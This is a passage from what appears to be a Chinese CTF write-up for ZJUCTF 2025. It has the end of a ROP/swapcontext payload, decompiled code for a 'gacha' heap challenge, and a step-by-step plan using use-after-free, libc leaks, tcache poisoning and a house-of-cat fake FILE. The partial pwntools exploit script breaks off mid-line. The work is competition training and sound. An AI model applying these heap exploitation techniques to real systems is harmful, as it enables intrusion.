p64(libc_base + <span class="number">0x11c590</span> + <span class="number">0xd</span>)</span><br><span class="line">orw += p64(<span class="number">0x40144d</span>)</span><br><span class="line">payload += orw</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">"write"</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000011b74f : mov rdx, rsi ; xor esi, esi ; syscall</span></span><br><span class="line"><span class="comment"># 0x00000000000dd237 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b * 0x401561")</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b * 0x401561")</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b"\xAA"</span>)</span><br><span class="line">payload += flat(</span><br><span class="line">    {</span><br><span class="line">        <span class="number">0x10</span>: buffer_addr + <span class="number">0x100</span>,</span><br><span class="line">        <span class="number">0x18</span>: buffer_addr + <span class="number">0x100</span>, <span class="comment"># rax</span></span><br><span class="line">        <span class="number">0x28</span>: swapcontext, <span class="comment"># call</span></span><br><span class="line">        <span class="number">0x68</span>: <span class="number">0x10</span>,  </span><br><span class="line">        <span class="number">0x70</span>: <span class="number">0x2000</span>, </span><br><span class="line">        <span class="number">0x88</span>: <span class="number">0x100</span>, </span><br><span class="line">        <span class="number">0xa0</span>: buffer_addr + <span class="number">0x10</span>, <span class="comment"># rsp</span></span><br><span class="line">        <span class="number">0xa8</span>: ret_gadget, </span><br><span class="line">        <span class="number">0xc8</span>: ret_gadget, </span><br><span class="line">        <span class="number">0xd0</span>: <span class="string">b"flag"</span>, </span><br><span class="line">        <span class="number">0xe0</span>: buffer_addr, </span><br><span class="line">    }, filler=<span class="string">b"\x00"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"I didn't catch it, can you say it again?"</span>, payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>感觉本题难点还是在如何布置虚表指针和泄露<code>libc</code>吧，后面的都一套秒了</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125233957631.png"></p>
<p>flag：<code>ZJUCTF{c_p1u5_p1u5_ru1n3d_my_84nd|6u6u6464}</code></p>
<h3 id="gacha">6 gacha</h3>
<p>这个题标了个<code>easy-medium</code> 然后上一个题，标的是<code>easy</code>，气笑了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> n4919; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_12E9();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(s_0);                                  <span class="comment">// "==============================\n|   Honkai Gacha Simulator   |\n|   1.one pull               |\n|   2.ten pull               |\n|   3.show record            |\n|   4.save record(last 20)   |\n|   5.delete record          |\n|   6.list statistics        |\n|   7.clear history          |\n|   8.set random seed        |\n|   9.exit                   |\n=============================="</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    n4919 = get_int();</span><br><span class="line">    <span class="keyword">if</span> ( n4919 &gt; <span class="number">9</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( n4919 != <span class="number">4919</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      chance = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( n4919 &gt; <span class="number">0</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">switch</span> ( n4919 )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            one_pull();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">              one_pull();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            delete();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">list</span>();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            clear();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            set_seed();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">LABEL_20:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice."</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>一个菜单题，题目大意是抽卡，先把各个函数过一遍</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">one_pull</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 n0xD; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  n0xD = <span class="built_in">rand</span>() % <span class="number">255</span> + <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">sub_13B4</span>(n0xD);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">le_0D</span>(n0xD) )</span><br><span class="line">    ++dword_4218;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ++dword_421C;</span><br><span class="line">  s_1[dword_4214] = n0xD;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">20</span> * ((dword_4214 + <span class="number">1</span>) / <span class="number">20</span>));</span><br><span class="line">  dword_4214 = (dword_4214 + <span class="number">1</span>) % <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><code>one_pull</code>里面调用了一个随机数生成，然后去卡池里抽卡，++的两个常数的卡的品质，我们不关心，然后会将抽出来的卡按序存到全局变量s_1中</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">set_seed</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter seed:"</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">16</span>, stdin);</span><br><span class="line">  seed = <span class="built_in">atol</span>(s);</span><br><span class="line">  <span class="built_in">srand</span>(seed);</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><code>set_seed</code>函数里面可以设置随机数种子</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="built_in">memset</span>(s_1, <span class="number">0</span>, <span class="built_in">sizeof</span>(s_1));</span><br><span class="line">  dword_4214 = <span class="number">0</span>;</span><br><span class="line">  dword_4218 = <span class="number">0</span>;</span><br><span class="line">  dword_421C = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"History cleared."</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><code>clear</code>函数可以清除已抽到的卡</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> list()</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">printf</span>(<span class="string">"Total pulls: %d\n"</span>, dword_4218 + dword_421C);</span><br><span class="line">  <span class="keyword">printf</span>(<span class="string">"\x1B[1;33mRare\x1B[0m characters: %d\n"</span>, dword_4218);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">printf</span>(<span class="string">"\x1B[1;35mCommon\x1B[0m characters: %d\n"</span>, dword_421C);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><code>list</code>可以打印出当前抽到了多少卡，哪些是好的哪些是不好的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0xC; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  n0xC = <span class="built_in">get_int</span>();</span><br><span class="line">  <span class="keyword">if</span> ( n0xC &gt;= <span class="number">0xC</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid index."</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !clist[n0xC] )</span><br><span class="line">    clist[n0xC] = <span class="built_in">malloc</span>(<span class="number">0xE4</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter message:"</span>);</span><br><span class="line">  <span class="built_in">fgets</span>((<span class="type">char</span> *)(clist[n0xC] + <span class="number">0x14</span>LL), <span class="number">208</span>, stdin);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; s_1[(dword_4214 - i + <span class="number">19</span>) % <span class="number">20</span>]; ++i )</span><br><span class="line">    *(_BYTE *)(clist[n0xC] + i) = s_1[(dword_4214 - i + <span class="number">19</span>) % <span class="number">20</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Record saved."</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><code>add</code>函数可以分配一个堆块，将所有抽到的卡存储到堆块前<code>0x20</code>个字节，然后在后面可以留message，这里没有溢出</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> iddx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  iddx = <span class="built_in">get_int</span>();</span><br><span class="line">  <span class="keyword">if</span> ( iddx &gt;= <span class="number">0xC</span> || !clist[iddx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid index."</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)clist[iddx]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Record deleted."</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><code>delete</code>就是释放堆块，这里没有清空指针有一个UAF</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0xC; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  n0xC = <span class="built_in">get_int</span>();</span><br><span class="line">  <span class="keyword">if</span> ( n0xC &gt;= <span class="number">0xC</span> || !clist[n0xC] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid index."</span>);</span><br><span class="line">  result = <span class="built_in">printf</span>(<span class="string">"Message: %s"</span>, (<span class="type">const</span> <span class="type">char</span> *)(clist[n0xC] + <span class="number">20LL</span>));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    v1 = clist[n0xC];</span><br><span class="line">    result = *(<span class="type">unsigned</span> __int8 *)(v1 + i);</span><br><span class="line">    <span class="keyword">if</span> ( !*(_BYTE *)(v1 + i) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    result = <span class="built_in">sub_13B4</span>(*(_BYTE *)(v1 + i));</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><code>show</code>就是正常的<code>show</code></p>
<p>除此之外还有一个函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_13B4</span><span class="params">(<span class="type">unsigned</span> __int8 n0xD)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( n0xD &gt; <span class="number">0xD</span>u )</span><br><span class="line">    s = (<span class="type">char</span> *)*(&amp;off_40A0 + (n0xD - <span class="number">14</span>) % <span class="number">22</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    s = (<span class="type">char</span> *)*(&amp;off_4020 + n0xD - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( chance )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"(%d)%s\n"</span>, n0xD, s);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>这个函数的作用是打印抽出的卡的序号和名字，根据一个变量来做是否打印出序号的分支，这个变量我们可以在菜单中输入4919来设置</p>
<p>那本题思路就相当明确了</p>
<ul>
<li>第一步设置<code>chance</code>为1，利用UAF漏洞释放七个小堆块填满tcache 链子，再释放一个到unsorted bin，然后调用show，泄露libc地址
<ul>
<li>因为卡牌序列是存储在堆块前0x20个字节的，堆块是否后卡牌序列即小端序unsorted bin的fd指针，通过show中打印序号可知</li>
</ul></li>
<li>第二步利用UAF更改tcache bin的fd指向<code>__IO_list_all</code>
<ul>
<li>这里要进行随机数爆破，即爆破出一个随机数，它的第一次rand出来的数对255取余等于我们要生成的数-1，这个爆破还是很快的</li>
<li>然后利用<code>one_pull</code>向<code>s_1</code>中填充该字节，以此类推填充整个我们要篡改的<code>fd</code></li>
<li>在打题的时候电脑环境不太对，自己调libc里面的rand的结果和实际运行程序rand的结果不一样，但通过调试发现程序运行的rand的结果和远程是一样的，而且程序确实会把rand出来的随机数打印出来，所以我当时选择直接用程序去爆破随机数了hhhh</li>
</ul></li>
<li>第三步将<code>__IO_list_all</code>申请出来改为伪造的<code>IO_FILE</code>的地址，<code>IO</code>板子选择<code>house of cat</code>
<ul>
<li>本题限制了堆块分配的大小，所以我们伪造的<code>IO_FILe</code>实际上要横跨两个堆块，注意板子完整性就好。</li>
</ul></li>
</ul>
<p>本题exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = websocket(<span class="string">"wss://ctf.zjusec.com/api/proxy/b10f13b1-d923-4f21-a5d1-38ae74fde6e1"</span>)</span><br><span class="line"><span class="comment"># p = process("./vuln")</span></span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>, <span class="string">"splitw"</span>, <span class="string">"-h"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Union</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_find = cdll.LoadLibrary("./libc.so.6")</span></span><br><span class="line">    <span class="keyword">return</span> seeds</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_and_pack</span>(<span class="params">multiline_string</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    REGEX_PATTERN = <span class="string">r"\((\d+)\)"</span></span><br><span class="line">    packed_bytes = <span class="string">b''</span></span><br><span class="line">    extracted_values: <span class="type">List</span>[<span class="built_in">int</span>] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> multiline_string.strip().split(<span class="string">'\n'</span>):</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">match</span> = re.search(REGEX_PATTERN, line)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            value_str = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                value = <span class="built_in">int</span>(value_str)</span><br><span class="line">                extracted_values.append(value)                </span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                </span><br><span class="line">    reversed_values = extracted_values[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> reversed_values:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            byte_data = p8(value)</span><br><span class="line">            packed_bytes += byte_data</span><br><span class="line">        <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    result_integer = <span class="built_in">int</span>.from_bytes(packed_bytes, byteorder=<span class="string">'big'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result_integer</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">b"Index:"</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b"Enter message:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    sla(<span class="string">b"Index:"</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">b"Index:"</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    leak = <span class="string">b""</span></span><br><span class="line">    response = <span class="string">b""</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        line = p.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b"("</span> <span class="keyword">not</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        response += line</span><br><span class="line">    <span class="keyword">return</span> extract_and_pack(response.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chance</span>():</span><br><span class="line">    sla(<span class="string">b"&gt; "</span>, <span 